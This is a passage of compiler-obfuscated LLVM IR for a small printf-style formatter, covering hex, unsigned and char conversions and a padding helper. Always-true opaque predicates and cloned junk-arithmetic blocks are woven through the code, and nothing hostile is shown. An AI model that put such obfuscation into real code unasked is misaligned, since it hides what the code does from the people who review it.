; <label>:309:                                    ; preds = %originalBBpart254
  %310 = load i8*, i8** %13, align 8
  %311 = load i8, i8* %310, align 1
  %312 = zext i8 %311 to i32
  %313 = icmp eq i32 %312, 120
  br i1 %313, label %314, label %371

; <label>:314:                                    ; preds = %309
  %315 = load i32, i32* @x.33
  %316 = load i32, i32* @y.34
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %314
  %323 = load i8**, i8*** %12, align 8
  %324 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %325 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %324, i32 0, i32 0
  %326 = load i32, i32* %325, align 8
  %327 = icmp ule i32 %326, 40
  %328 = load i32, i32* @x.33
  %329 = load i32, i32* @y.34
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br i1 %327, label %336, label %342

; <label>:336:                                    ; preds = %originalBBpart286
  %337 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %324, i32 0, i32 3
  %338 = load i8*, i8** %337, align 8
  %339 = getelementptr i8, i8* %338, i32 %326
  %340 = bitcast i8* %339 to i32*
  %341 = add i32 %326, 8
  store i32 %341, i32* %325, align 8
  br label %347

; <label>:342:                                    ; preds = %originalBBpart286
  %343 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %324, i32 0, i32 2
  %344 = load i8*, i8** %343, align 8
  %345 = bitcast i8* %344 to i32*
  %346 = getelementptr i8, i8* %344, i32 8
  store i8* %346, i8** %343, align 8
  br label %347

; <label>:347:                                    ; preds = %342, %336
  %348 = phi i32* [ %340, %336 ], [ %345, %342 ]
  %349 = load i32, i32* @x.33
  %350 = load i32, i32* @y.34
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %347
  %357 = load i32, i32* %348, align 4
  %358 = load i32, i32* %15, align 4
  %359 = load i32, i32* %16, align 4
  %360 = call i32 @printi(i8** %323, i32 %357, i32 16, i32 0, i32 %358, i32 %359, i32 97)
  %361 = load i32, i32* %17, align 4
  %362 = add nsw i32 %361, %360
  store i32 %362, i32* %17, align 4
  %363 = load i32, i32* @x.33
  %364 = load i32, i32* @y.34
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBBpart299, label %originalBB88alteredBB

originalBBpart299:                                ; preds = %originalBB88
  br label %555

; <label>:371:                                    ; preds = %309
  %372 = load i8*, i8** %13, align 8
  %373 = load i8, i8* %372, align 1
  %374 = zext i8 %373 to i32
  %375 = icmp eq i32 %374, 88
  br i1 %375, label %376, label %417

; <label>:376:                                    ; preds = %371
  %377 = load i8**, i8*** %12, align 8
  %378 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %379 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %378, i32 0, i32 0
  %380 = load i32, i32* %379, align 8
  %381 = icmp ule i32 %380, 40
  br i1 %381, label %382, label %388

; <label>:382:                                    ; preds = %376
  %383 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %378, i32 0, i32 3
  %384 = load i8*, i8** %383, align 8
  %385 = getelementptr i8, i8* %384, i32 %380
  %386 = bitcast i8* %385 to i32*
  %387 = add i32 %380, 8
  store i32 %387, i32* %379, align 8
  br label %409

; <label>:388:                                    ; preds = %376
  %389 = load i32, i32* @x.33
  %390 = load i32, i32* @y.34
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %388
  %397 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %378, i32 0, i32 2
  %398 = load i8*, i8** %397, align 8
  %399 = bitcast i8* %398 to i32*
  %400 = getelementptr i8, i8* %398, i32 8
  store i8* %400, i8** %397, align 8
  %401 = load i32, i32* @x.33
  %402 = load i32, i32* @y.34
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br label %409

; <label>:409:                                    ; preds = %originalBBpart2103, %382
  %410 = phi i32* [ %386, %382 ], [ %399, %originalBBpart2103 ]
  %411 = load i32, i32* %410, align 4
  %412 = load i32, i32* %15, align 4
  %413 = load i32, i32* %16, align 4
  %414 = call i32 @printi(i8** %377, i32 %411, i32 16, i32 0, i32 %412, i32 %413, i32 65)
  %415 = load i32, i32* %17, align 4
  %416 = add nsw i32 %415, %414
  store i32 %416, i32* %17, align 4
  br label %555

; <label>:417:                                    ; preds = %371
  %418 = load i8*, i8** %13, align 8
  %419 = load i8, i8* %418, align 1
  %420 = zext i8 %419 to i32
  %421 = icmp eq i32 %420, 117
  br i1 %421, label %422, label %479

; <label>:422:                                    ; preds = %417
  %423 = load i8**, i8*** %12, align 8
  %424 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %425 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 8
  %427 = icmp ule i32 %426, 40
  br i1 %427, label %428, label %450

; <label>:428:                                    ; preds = %422
  %429 = load i32, i32* @x.33
  %430 = load i32, i32* @y.34
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %428
  %437 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 3
  %438 = load i8*, i8** %437, align 8
  %439 = getelementptr i8, i8* %438, i32 %426
  %440 = bitcast i8* %439 to i32*
  %441 = add i32 %426, 8
  store i32 %441, i32* %425, align 8
  %442 = load i32, i32* @x.33
  %443 = load i32, i32* @y.34
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBBpart2121, label %originalBB105alteredBB

originalBBpart2121:                               ; preds = %originalBB105
  br label %455

; <label>:450:                                    ; preds = %422
  %451 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 2
  %452 = load i8*, i8** %451, align 8
  %453 = bitcast i8* %452 to i32*
  %454 = getelementptr i8, i8* %452, i32 8
  store i8* %454, i8** %451, align 8
  br label %455

; <label>:455:                                    ; preds = %450, %originalBBpart2121
  %456 = phi i32* [ %440, %originalBBpart2121 ], [ %453, %450 ]
  %457 = load i32, i32* @x.33
  %458 = load i32, i32* @y.34
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBB123, label %originalBB123alteredBB

originalBB123:                                    ; preds = %originalBB123alteredBB, %455
  %465 = load i32, i32* %456, align 4
  %466 = load i32, i32* %15, align 4
  %467 = load i32, i32* %16, align 4
  %468 = call i32 @printi(i8** %423, i32 %465, i32 10, i32 0, i32 %466, i32 %467, i32 97)
  %469 = load i32, i32* %17, align 4
  %470 = add nsw i32 %469, %468
  store i32 %470, i32* %17, align 4
  %471 = load i32, i32* @x.33
  %472 = load i32, i32* @y.34
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBBpart2135, label %originalBB123alteredBB

originalBBpart2135:                               ; preds = %originalBB123
  br label %555

; <label>:479:                                    ; preds = %417
  %480 = load i8*, i8** %13, align 8
  %481 = load i8, i8* %480, align 1
  %482 = zext i8 %481 to i32
  %483 = icmp eq i32 %482, 99
  br i1 %483, label %484, label %545

; <label>:484:                                    ; preds = %479
  %485 = load i32, i32* @x.33
  %486 = load i32, i32* @y.34
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %484
  %493 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %494 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %493, i32 0, i32 0
  %495 = load i32, i32* %494, align 8
  %496 = icmp ule i32 %495, 40
  %497 = load i32, i32* @x.33
  %498 = load i32, i32* @y.34
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br i1 %496, label %505, label %511

; <label>:505:                                    ; preds = %originalBBpart2139
  %506 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %493, i32 0, i32 3
  %507 = load i8*, i8** %506, align 8
  %508 = getelementptr i8, i8* %507, i32 %495
  %509 = bitcast i8* %508 to i32*
  %510 = add i32 %495, 8
  store i32 %510, i32* %494, align 8
  br label %516

; <label>:511:                                    ; preds = %originalBBpart2139
  %512 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %493, i32 0, i32 2
  %513 = load i8*, i8** %512, align 8
  %514 = bitcast i8* %513 to i32*
  %515 = getelementptr i8, i8* %513, i32 8
  store i8* %515, i8** %512, align 8
  br label %516

; <label>:516:                                    ; preds = %511, %505
  %517 = phi i32* [ %509, %505 ], [ %514, %511 ]
  %518 = load i32, i32* @x.33
  %519 = load i32, i32* @y.34
  %520 = sub i32 %518, 1
  %521 = mul i32 %518, %520
  %522 = urem i32 %521, 2
  %523 = icmp eq i32 %522, 0
  %524 = icmp slt i32 %519, 10
  %525 = or i1 %523, %524
  br i1 %525, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %516
  %526 = load i32, i32* %517, align 4
  %527 = trunc i32 %526 to i8
  %528 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 0
  store i8 %527, i8* %528, align 1
  %529 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 1
  store i8 0, i8* %529, align 1
  %530 = load i8**, i8*** %12, align 8
  %531 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i32 0, i32 0
  %532 = load i32, i32* %15, align 4
  %533 = load i32, i32* %16, align 4
  %534 = call i32 @prints(i8** %530, i8* %531, i32 %532, i32 %533)
  %535 = load i32, i32* %17, align 4
  %536 = add nsw i32 %535, %534
  store i32 %536, i32* %17, align 4
  %537 = load i32, i32* @x.33
  %538 = load i32, i32* @y.34
  %539 = sub i32 %537, 1
  %540 = mul i32 %537, %539
  %541 = urem i32 %540, 2
  %542 = icmp eq i32 %541, 0
  %543 = icmp slt i32 %538, 10
  %544 = or i1 %542, %543
  br i1 %544, label %originalBBpart2147, label %originalBB141alteredBB

originalBBpart2147:                               ; preds = %originalBB141
  br label %555

; <label>:545:                                    ; preds = %479
  br label %554

; <label>:546:                                    ; preds = %33
  br label %547

; <label>:547:                                    ; preds = %546, %67
  %548 = load i8**, i8*** %12, align 8
  %549 = load i8*, i8** %13, align 8
  %550 = load i8, i8* %549, align 1
  %551 = zext i8 %550 to i32
  call void @printchar(i8** %548, i32 %551)
  %552 = load i32, i32* %17, align 4
  %553 = add nsw i32 %552, 1
  store i32 %553, i32* %17, align 4
  br label %554

; <label>:554:                                    ; preds = %547, %545
  br label %555

; <label>:555:                                    ; preds = %554, %originalBBpart2147, %originalBBpart2135, %409, %originalBBpart299, %originalBBpart282, %208
  %556 = load i8*, i8** %13, align 8
  %557 = getelementptr inbounds i8, i8* %556, i32 1
  store i8* %557, i8** %13, align 8
  br label %28

; <label>:558:                                    ; preds = %originalBBpart24, %28
  %559 = load i8**, i8*** %12, align 8
  %560 = icmp ne i8** %559, null
  br i1 %560, label %561, label %564

; <label>:561:                                    ; preds = %558
  %562 = load i8**, i8*** %12, align 8
  %563 = load i8*, i8** %562, align 8
  store i8 0, i8* %563, align 1
  br label %564

; <label>:564:                                    ; preds = %561, %558
  %565 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %566 = bitcast %struct.__va_list_tag* %565 to i8*
  call void @llvm.va_end(i8* %566)
  %567 = load i32, i32* %17, align 4
  ret i32 %567

originalBBalteredBB:                              ; preds = %originalBB, %3
  %568 = alloca i8**, align 8
  %569 = alloca i8*, align 8
  %570 = alloca %struct.__va_list_tag*, align 8
  %571 = alloca i32, align 4
  %572 = alloca i32, align 4
  %573 = alloca i32, align 4
  %574 = alloca [2 x i8], align 1
  %575 = alloca i8*, align 8
  store i8** %0, i8*** %568, align 8
  store i8* %1, i8** %569, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %570, align 8
  store i32 0, i32* %573, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %88
  %576 = load i8*, i8** %13, align 8
  %577 = load i8, i8* %576, align 1
  %578 = zext i8 %577 to i32
  %579 = icmp sge i32 %578, 48
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %116
  %580 = load i32, i32* %15, align 4
  %_ = sub i32 0, %580
  %gen = add i32 %_, 10
  %_11 = sub i32 %580, 10
  %gen12 = mul i32 %_11, 10
  %581 = mul nsw i32 %580, 10
  store i32 %581, i32* %15, align 4
  %582 = load i8*, i8** %13, align 8
  %583 = load i8, i8* %582, align 1
  %584 = zext i8 %583 to i32
  %_13 = shl i32 %584, 48
  %_14 = sub i32 0, %584
  %gen15 = add i32 %_14, 48
  %_16 = shl i32 %584, 48
  %_17 = shl i32 %584, 48
  %_18 = shl i32 %584, 48
  %_19 = shl i32 %584, 48
  %_20 = sub i32 %584, 48
  %gen21 = mul i32 %_20, 48
  %_22 = shl i32 %584, 48
  %_23 = sub i32 0, %584
  %gen24 = add i32 %_23, 48
  %585 = sub nsw i32 %584, 48
  %586 = load i32, i32* %15, align 4
  %_25 = sub i32 0, %586
  %gen26 = add i32 %_25, %585
  %_27 = sub i32 %586, %585
  %gen28 = mul i32 %_27, %585
  %_29 = sub i32 0, %586
  %gen30 = add i32 %_29, %585
  %_31 = sub i32 0, %586
  %gen32 = add i32 %_31, %585
  %_33 = shl i32 %586, %585
  %_34 = sub i32 %586, %585
  %gen35 = mul i32 %_34, %585
  %_36 = sub i32 %586, %585
  %gen37 = mul i32 %_36, %585
  %_38 = shl i32 %586, %585
  %_39 = sub i32 0, %586
  %gen40 = add i32 %_39, %585
  %587 = add nsw i32 %586, %585
  store i32 %587, i32* %15, align 4
  br label %originalBB10

originalBB44alteredBB:                            ; preds = %originalBB44, %149
  %588 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %589 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %588, i32 0, i32 0
  %590 = load i32, i32* %589, align 8
  %591 = icmp ule i32 %590, 40
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %176
  %592 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %158, i32 0, i32 2
  %593 = load i8*, i8** %592, align 8
  %594 = bitcast i8* %593 to i32*
  %595 = getelementptr i8, i8* %593, i32 8
  store i8* %595, i8** %592, align 8
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %215
  %596 = load i8*, i8** %13, align 8
  %597 = load i8, i8* %596, align 1
  %598 = zext i8 %597 to i32
  %599 = icmp eq i32 %598, 100
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %242
  %600 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %238, i32 0, i32 3
  %601 = load i8*, i8** %600, align 8
  %602 = getelementptr i8, i8* %601, i32 %240
  %603 = bitcast i8* %602 to i32*
  %_57 = shl i32 %240, 8
  %_58 = shl i32 %240, 8
  %_59 = shl i32 %240, 8
  %604 = add i32 %240, 8
  store i32 %604, i32* %239, align 8
  br label %originalBB56

originalBB63alteredBB:                            ; preds = %originalBB63, %264
  %605 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %238, i32 0, i32 2
  %606 = load i8*, i8** %605, align 8
  %607 = bitcast i8* %606 to i32*
  %608 = getelementptr i8, i8* %606, i32 8
  store i8* %608, i8** %605, align 8
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %285
  %609 = load i32, i32* %286, align 4
  %610 = load i32, i32* %15, align 4
  %611 = load i32, i32* %16, align 4
  %612 = call i32 @printi(i8** %237, i32 %609, i32 10, i32 1, i32 %610, i32 %611, i32 97)
  %613 = load i32, i32* %17, align 4
  %_68 = sub i32 0, %613
  %gen69 = add i32 %_68, %612
  %_70 = sub i32 0, %613
  %gen71 = add i32 %_70, %612
  %_72 = shl i32 %613, %612
  %_73 = sub i32 %613, %612
  %gen74 = mul i32 %_73, %612
  %_75 = sub i32 %613, %612
  %gen76 = mul i32 %_75, %612
  %_77 = shl i32 %613, %612
  %_78 = sub i32 0, %613
  %gen79 = add i32 %_78, %612
  %_80 = shl i32 %613, %612
  %614 = add nsw i32 %613, %612
  store i32 %614, i32* %17, align 4
  br label %originalBB67

originalBB84alteredBB:                            ; preds = %originalBB84, %314
  %615 = load i8**, i8*** %12, align 8
  %616 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %617 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %616, i32 0, i32 0
  %618 = load i32, i32* %617, align 8
  %619 = icmp ule i32 %618, 40
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %347
  %620 = load i32, i32* %348, align 4
  %621 = load i32, i32* %15, align 4
  %622 = load i32, i32* %16, align 4
  %623 = call i32 @printi(i8** %323, i32 %620, i32 16, i32 0, i32 %621, i32 %622, i32 97)
  %624 = load i32, i32* %17, align 4
  %_89 = shl i32 %624, %623
  %_90 = sub i32 %624, %623
  %gen91 = mul i32 %_90, %623
  %_92 = sub i32 0, %624
  %gen93 = add i32 %_92, %623
  %_94 = shl i32 %624, %623
  %_95 = sub i32 0, %624
  %gen96 = add i32 %_95, %623
  %_97 = shl i32 %624, %623
  %625 = add nsw i32 %624, %623
  store i32 %625, i32* %17, align 4
  br label %originalBB88

originalBB101alteredBB:                           ; preds = %originalBB101, %388
  %626 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %378, i32 0, i32 2
  %627 = load i8*, i8** %626, align 8
  %628 = bitcast i8* %627 to i32*
  %629 = getelementptr i8, i8* %627, i32 8
  store i8* %629, i8** %626, align 8
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %428
  %630 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 3
  %631 = load i8*, i8** %630, align 8
  %632 = getelementptr i8, i8* %631, i32 %426
  %633 = bitcast i8* %632 to i32*
  %_106 = sub i32 0, %426
  %gen107 = add i32 %_106, 8
  %_108 = shl i32 %426, 8
  %_109 = sub i32 0, %426
  %gen110 = add i32 %_109, 8
  %_111 = shl i32 %426, 8
  %_112 = sub i32 0, %426
  %gen113 = add i32 %_112, 8
  %_114 = sub i32 %426, 8
  %gen115 = mul i32 %_114, 8
  %_116 = sub i32 %426, 8
  %gen117 = mul i32 %_116, 8
  %_118 = sub i32 0, %426
  %gen119 = add i32 %_118, 8
  %634 = add i32 %426, 8
  store i32 %634, i32* %425, align 8
  br label %originalBB105

originalBB123alteredBB:                           ; preds = %originalBB123, %455
  %635 = load i32, i32* %456, align 4
  %636 = load i32, i32* %15, align 4
  %637 = load i32, i32* %16, align 4
  %638 = call i32 @printi(i8** %423, i32 %635, i32 10, i32 0, i32 %636, i32 %637, i32 97)
  %639 = load i32, i32* %17, align 4
  %_124 = sub i32 %639, %638
  %gen125 = mul i32 %_124, %638
  %_126 = sub i32 %639, %638
  %gen127 = mul i32 %_126, %638
  %_128 = sub i32 %639, %638
  %gen129 = mul i32 %_128, %638
  %_130 = sub i32 %639, %638
  %gen131 = mul i32 %_130, %638
  %_132 = sub i32 0, %639
  %gen133 = add i32 %_132, %638
  %640 = add nsw i32 %639, %638
  store i32 %640, i32* %17, align 4
  br label %originalBB123

originalBB137alteredBB:                           ; preds = %originalBB137, %484
  %641 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %642 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %641, i32 0, i32 0
  %643 = load i32, i32* %642, align 8
  %644 = icmp ule i32 %643, 40
  br label %originalBB137

originalBB141alteredBB:                           ; preds = %originalBB141, %516
  %645 = load i32, i32* %517, align 4
  %646 = trunc i32 %645 to i8
  %647 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 0
  store i8 %646, i8* %647, align 1
  %648 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 1
  store i8 0, i8* %648, align 1
  %649 = load i8**, i8*** %12, align 8
  %650 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i32 0, i32 0
  %651 = load i32, i32* %15, align 4
  %652 = load i32, i32* %16, align 4
  %653 = call i32 @prints(i8** %649, i8* %650, i32 %651, i32 %652)
  %654 = load i32, i32* %17, align 4
  %_142 = sub i32 %654, %653
  %gen143 = mul i32 %_142, %653
  %_144 = sub i32 0, %654
  %gen145 = add i32 %_144, %653
  %655 = add nsw i32 %654, %653
  store i32 %655, i32* %17, align 4
  br label %originalBB141
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %74

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %56, %15
  %18 = load i32, i32* @x.35
  %19 = load i32, i32* @y.36
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i8*, i8** %12, align 8
  %27 = load i8, i8* %26, align 1
  %28 = icmp ne i8 %27, 0
  %29 = load i32, i32* @x.35
  %30 = load i32, i32* @y.36
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %28, label %37, label %59

; <label>:37:                                     ; preds = %originalBBpart2
  %38 = load i32, i32* @x.35
  %39 = load i32, i32* @y.36
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* %11, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %11, align 4
  %48 = load i32, i32* @x.35
  %49 = load i32, i32* @y.36
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart27, label %originalBB1alteredBB

originalBBpart27:                                 ; preds = %originalBB1
  br label %56

; <label>:56:                                     ; preds = %originalBBpart27
  %57 = load i8*, i8** %12, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %12, align 8
  br label %17

; <label>:59:                                     ; preds = %originalBBpart2
  %60 = load i32, i32* %11, align 4
  %61 = load i32, i32* %7, align 4
  %62 = icmp sge i32 %60, %61
  br i1 %62, label %63, label %64

; <label>:63:                                     ; preds = %59
  store i32 0, i32* %7, align 4
  br label %68

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %11, align 4
  %66 = load i32, i32* %7, align 4
  %67 = sub nsw i32 %66, %65
  store i32 %67, i32* %7, align 4
  br label %68

; <label>:68:                                     ; preds = %64, %63
  %69 = load i32, i32* %8, align 4
  %70 = and i32 %69, 2
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %68
  store i32 48, i32* %10, align 4
  br label %73

; <label>:73:                                     ; preds = %72, %68
  br label %74

; <label>:74:                                     ; preds = %73, %4
  %75 = load i32, i32* %8, align 4
  %76 = and i32 %75, 1
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %123, label %78

; <label>:78:                                     ; preds = %74
  br label %79

; <label>:79:                                     ; preds = %103, %78
  %80 = load i32, i32* %7, align 4
  %81 = icmp sgt i32 %80, 0
  br i1 %81, label %82, label %106

; <label>:82:                                     ; preds = %79
  %83 = load i32, i32* @x.35
  %84 = load i32, i32* @y.36
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %82
  %91 = load i8**, i8*** %5, align 8
  %92 = load i32, i32* %10, align 4
  call void @printchar(i8** %91, i32 %92)
  %93 = load i32, i32* %9, align 4
  %94 = add nsw i32 %93, 1
  store i32 %94, i32* %9, align 4
  %95 = load i32, i32* @x.35
  %96 = load i32, i32* @y.36
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart217, label %originalBB9alteredBB

originalBBpart217:                                ; preds = %originalBB9
  br label %103

; <label>:103:                                    ; preds = %originalBBpart217
  %104 = load i32, i32* %7, align 4
  %105 = add nsw i32 %104, -1
  store i32 %105, i32* %7, align 4
  br label %79

; <label>:106:                                    ; preds = %79
  %107 = load i32, i32* @x.35
  %108 = load i32, i32* @y.36
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %106
  %115 = load i32, i32* @x.35
  %116 = load i32, i32* @y.36
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %123

; <label>:123:                                    ; preds = %originalBBpart221, %74
  br label %124

; <label>:124:                                    ; preds = %originalBBpart230, %123
  %125 = load i32, i32* @x.35
  %126 = load i32, i32* @y.36
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %124
  %133 = load i8*, i8** %6, align 8
  %134 = load i8, i8* %133, align 1
  %135 = icmp ne i8 %134, 0
  %136 = load i32, i32* @x.35
  %137 = load i32, i32* @y.36
  %138 = sub i32 %136, 1
